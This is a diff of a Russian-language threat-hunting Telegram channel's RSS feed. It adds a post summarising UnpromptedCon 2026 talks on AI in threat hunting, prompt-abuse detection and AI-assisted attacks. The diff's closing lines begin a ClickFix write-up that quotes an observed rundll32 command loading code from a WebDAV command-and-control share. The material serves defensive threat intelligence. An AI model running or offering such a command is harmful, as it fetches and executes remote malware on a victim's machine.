@@ -1,5 +1,20 @@
 <?xml version="1.0" encoding="utf-8"?>
-<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting Father 🦔</title><link>https://t.me/ThreatHuntingFather</link><description>All about Threat Hunting, detecting malicious activity</description><language>ru</language><lastBuildDate>Tue, 24 Mar 2026 19:29:36 +0000</lastBuildDate><item><title>The ClickFix Evolution: New Variant Replaces PowerShell with Rundll32 and WebDAV</title><link>https://t.me/ThreatHuntingFather/1248</link><description>The ClickFix Evolution: New Variant Replaces PowerShell with Rundll32 and WebDAV
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Threat Hunting Father 🦔</title><link>https://t.me/ThreatHuntingFather</link><description>All about Threat Hunting, detecting malicious activity</description><language>ru</language><lastBuildDate>Fri, 27 Mar 2026 04:16:03 +0000</lastBuildDate><item><title>Сейчас “из каждого утюга” звучит AI, но на UnpromptedCon 2026 уже показывали вполне прикольные кейсы. Для себя отобрал несколько докладов, которые, на мой взгляд, реально интересно посмотреть:</title><link>https://t.me/ThreatHuntingFather/1251</link><description>Сейчас “из каждого утюга” звучит AI, но на UnpromptedCon 2026 уже показывали вполне прикольные кейсы. Для себя отобрал несколько докладов, которые, на мой взгляд, реально интересно посмотреть:
+👩‍💻ai-threat-hunting-datadog - про границу automation в threat hunting: где LLM помогает с query generation и field discovery, а где начинает сыпаться на schema drift, ошибках синтаксиса и требует ручной проверки.
+✍️1.8m-prompts-salesforce - про hunting abuse в user-defined agent ecosystem на production-масштабе: как из огромного потока промптов вытаскивать подозрительное поведение через baseline deviation, а не через сигнатуры самих prompt’ов.
+✏️✏️vibehacking-8-minutes-sysdig - про AI-assisted атаки и те машинные артефакты, которые такие цепочки начинают оставлять в телеметрии: скорость, synthetic mistakes, environment mismatch и нетипичное поведение в cloud.
+🔎detection-deception-greynoise - про Orbie, внутреннего AI-assisted analyst’а GreyNoise, который работает поверх internet-scale sensor/deception telemetry и помогает с hunting, triage, PCAP/OAST analysis и validation находок.
+🐱genai-yara-semantic-paloalto - про YARA-like semantic rules для GenAI/web threats, где обычные regex и сигнатуры начинают слепнуть на paraphrase, indirect phrasing и другой semantic abuse.
+🔎osint-knowledge-graph-paloalto - про production-подход, где из сырых OSINT / threat reports собирают knowledge graph и queryable TI-слой для более быстрых связок, pivot’ов и evidence-based ответов.
+🔎sift-claude-code-dfir-sans - про использование Claude Code в SIFT / DFIR-контексте как orchestration-слоя поверх форензик-инструментов.
+🔺binaryshield-threat-intelligence-llm - про cross-service threat intelligence для LLM-сервисов и privacy-preserving correlation между разными продуктами, чтобы сопоставлять похожие атаки без прямого обмена сырыми данными.
+Остальное можно посмотреть в GitHub со слайдами их там 48:
+🔗 https://github.com/ethanolivertroy/unpromptedcon-2026-slides
+Страница конференции:
+🔗https://unpromptedcon.org/
+🦔 THF
+
+[Media: Документ]</description><pubDate>Fri, 27 Mar 2026 04:16:03 +0000</pubDate><guid isPermaLink="false">telegram_ThreatHuntingFather_1251</guid></item><item><title>The ClickFix Evolution: New Variant Replaces PowerShell with Rundll32 and WebDAV</title><link>https://t.me/ThreatHuntingFather/1248</link><description>The ClickFix Evolution: New Variant Replaces PowerShell with Rundll32 and WebDAV
 Мы любим кликфиксы и смотрим за развитием этой техники😁
 The commands observed during analysis:
 rundll32.exe \\ С2@80\verification.google,#1
